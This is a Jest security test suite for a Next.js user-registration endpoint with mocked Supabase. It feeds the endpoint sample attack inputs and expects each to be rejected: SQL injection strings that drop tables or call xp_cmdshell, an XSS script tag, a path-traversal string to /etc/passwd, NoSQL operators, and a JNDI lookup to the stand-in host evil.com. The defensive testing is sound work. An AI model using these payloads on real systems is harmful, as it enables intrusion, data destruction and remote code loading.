/**
 * Security tests for authentication endpoints
 * Tests registration, login, and session management security
 */

import { NextRequest } from 'next/server'
import { POST } from '@/app/api/auth/register/route'

// Mock Supabase
const mockSupabaseAuth = {
  signUp: jest.fn(),
  signInWithPassword: jest.fn(),
  getUser: jest.fn()
}

const mockSupabaseDb = {
  from: jest.fn(() => ({
    insert: jest.fn().mockResolvedValue({ data: null, error: null }),
    select: jest.fn().mockReturnThis(),
    eq: jest.fn().mockResolvedValue({ data: null, error: null }),
    delete: jest.fn().mockResolvedValue({ data: null, error: null })
  }))
}

jest.mock('@supabase/supabase-js', () => ({
  createClient: jest.fn(() => ({
    auth: mockSupabaseAuth,
    from: mockSupabaseDb.from
  }))
}))

// Mock environment variables
process.env.NEXT_PUBLIC_SUPABASE_URL = 'https://test.supabase.co'
process.env.SUPABASE_SERVICE_ROLE_KEY = 'test-service-key'

describe('Authentication Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  const mockRequest = (body: any) =>
    new NextRequest('http://localhost:3000/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    })

  describe('Registration Security', () => {
    test('should reject registration with SQL injection in email', async () => {
      const maliciousEmails = [
        "admin'; DROP TABLE users; --@test.com",
        "'; INSERT INTO admin VALUES('hacked'); --",
        "user@domain.com'; EXEC xp_cmdshell('dir'); --",
        "test'; DELETE FROM tenants WHERE '1'='1'; --@test.com"
      ]

      for (const email of maliciousEmails) {
        mockSupabaseAuth.signUp.mockResolvedValue({
          data: { user: null },
          error: { message: 'Invalid email format' }
        })

        const request = mockRequest({
          email,
          password: 'validPassword123!',
          tenant_name: 'Valid Company'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toBeDefined()
      }
    })

    test('should reject weak passwords', async () => {
      const weakPasswords = [
        '123',
        'password',
        '12345678',
        'qwerty',
        'admin',
        'password123',
        '\'; DROP TABLE users; --'
      ]

      for (const password of weakPasswords) {
        const request = mockRequest({
          email: 'test@test.com',
          password,
          tenant_name: 'Valid Company'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toContain('Password')
      }
    })

    test('should reject malicious tenant names', async () => {
      const maliciousTenantNames = [
        "'; DROP TABLE tenants; --",
        "<script>alert('xss')</script>",
        "Company'; INSERT INTO admin VALUES('hack'); --",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}"
      ]

      for (const tenantName of maliciousTenantNames) {
        const request = mockRequest({
          email: 'test@test.com',
          password: 'ValidPassword123!',
          tenant_name: tenantName
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toBeDefined()
      }
    })

    test('should sanitize and validate input data', async () => {
      mockSupabaseAuth.signUp.mockResolvedValue({
        data: { 
          user: { 
            id: 'test-user-id', 
            email: 'test@test.com',
            email_confirmed_at: new Date().toISOString()
          } 
        },
        error: null
      })

      const request = mockRequest({
        email: '  TEST@TEST.COM  ', // Should be trimmed and lowercased
        password: 'ValidPassword123!',
        tenant_name: '  Valid Company Name  ' // Should be trimmed
      })

      const response = await POST(request)
      
      if (response.status === 201) {
        // Verify that Supabase was called with sanitized data
        expect(mockSupabaseAuth.signUp).toHaveBeenCalledWith({
          email: 'test@test.com',
          password: 'ValidPassword123!'
        })
      }
    })

    test('should prevent duplicate registrations', async () => {
      mockSupabaseAuth.signUp.mockResolvedValue({
        data: { user: null },
        error: { message: 'User already registered' }
      })

      const request = mockRequest({
        email: 'existing@test.com',
        password: 'ValidPassword123!',
        tenant_name: 'Valid Company'
      })

      const response = await POST(request)
      const data = await response.json()

      expect(response.status).toBe(400)
      expect(data.error).toContain('already registered')
    })
  })

  describe('Input Validation', () => {
    test('should reject missing required fields', async () => {
      const incompleteRequests = [
        { password: 'ValidPassword123!', tenant_name: 'Company' }, // Missing email
        { email: 'test@test.com', tenant_name: 'Company' }, // Missing password
        { email: 'test@test.com', password: 'ValidPassword123!' }, // Missing tenant_name
        {} // Empty request
      ]

      for (const body of incompleteRequests) {
        const request = mockRequest(body)
        const response = await POST(request)
        
        expect(response.status).toBe(400)
      }
    })

    test('should reject invalid email formats', async () => {
      const invalidEmails = [
        'notanemail',
        '@test.com',
        'test@',
        'test.com',
        'test@test',
        'test..test@test.com',
        'test@test..com'
      ]

      for (const email of invalidEmails) {
        const request = mockRequest({
          email,
          password: 'ValidPassword123!',
          tenant_name: 'Valid Company'
        })

        const response = await POST(request)
        expect(response.status).toBe(400)
      }
    })

    test('should limit input field lengths', async () => {
      const longEmail = 'a'.repeat(100) + '@test.com'
      const longTenantName = 'a'.repeat(1000)
      const longPassword = 'a'.repeat(500)

      const request = mockRequest({
        email: longEmail,
        password: longPassword,
        tenant_name: longTenantName
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
    })
  })

  describe('Rate Limiting Preparation', () => {
    test('should handle malformed JSON gracefully', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{ invalid json syntax }'
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
    })

    test('should handle oversized payloads', async () => {
      const oversizedPayload = {
        email: 'test@test.com',
        password: 'ValidPassword123!',
        tenant_name: 'a'.repeat(10000), // Very large payload
        extra_data: 'x'.repeat(50000)
      }

      const request = mockRequest(oversizedPayload)
      const response = await POST(request)
      
      // Should either reject or handle gracefully
      expect([200, 400, 413]).toContain(response.status)
    })
  })

  describe('Error Information Disclosure', () => {
    test('should not expose sensitive error details', async () => {
      mockSupabaseAuth.signUp.mockResolvedValue({
        data: { user: null },
        error: { 
          message: 'Database connection failed on host internal-db.company.com port 5432',
          details: 'Connection timeout to internal systems'
        }
      })

      const request = mockRequest({
        email: 'test@test.com',
        password: 'ValidPassword123!',
        tenant_name: 'Valid Company'
      })

      const response = await POST(request)
      const data = await response.json()

      // Should not expose internal database details
      expect(data.error).not.toContain('internal-db')
      expect(data.error).not.toContain('port 5432')
      expect(data.error).not.toContain('timeout')
      expect(data.error).not.toContain('Database connection')
    })

    test('should provide different error messages in production vs development', async () => {
      // Mock NODE_ENV using Jest
      const originalEnv = process.env.NODE_ENV
      Object.defineProperty(process.env, 'NODE_ENV', {
        value: 'production',
        writable: true
      })
      
      mockSupabaseAuth.signUp.mockResolvedValue({
        data: { user: null },
        error: { message: 'Internal server error with sensitive details' }
      })

      const request = mockRequest({
        email: 'test@test.com',
        password: 'ValidPassword123!',
        tenant_name: 'Valid Company'
      })

      const response = await POST(request)
      const data = await response.json()

      if (response.status === 500) {
        expect(data.error).toBe('Registration failed. Please try again.')
      }
      
      // Restore environment
      Object.defineProperty(process.env, 'NODE_ENV', {
        value: originalEnv,
        writable: true
      })
    })
  })

  describe('OWASP Top 10 Compliance', () => {
    test('should prevent NoSQL injection in tenant operations', async () => {
      const nosqlInjectionPayloads = [
        { $ne: null },
        { $where: "function() { return true; }" },
        { $regex: ".*" },
        "'; return db.users.find(); //"
      ]

      for (const payload of nosqlInjectionPayloads) {
        const request = mockRequest({
          email: 'test@test.com',
          password: 'ValidPassword123!',
          tenant_name: JSON.stringify(payload)
        })

        const response = await POST(request)
        expect(response.status).toBe(400)
      }
    })

    test('should validate Content-Type header', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' }, // Wrong content type
        body: JSON.stringify({
          email: 'test@test.com',
          password: 'ValidPassword123!',
          tenant_name: 'Valid Company'
        })
      })

      const response = await POST(request)
      expect([400, 415]).toContain(response.status) // Bad Request or Unsupported Media Type
    })
  })
})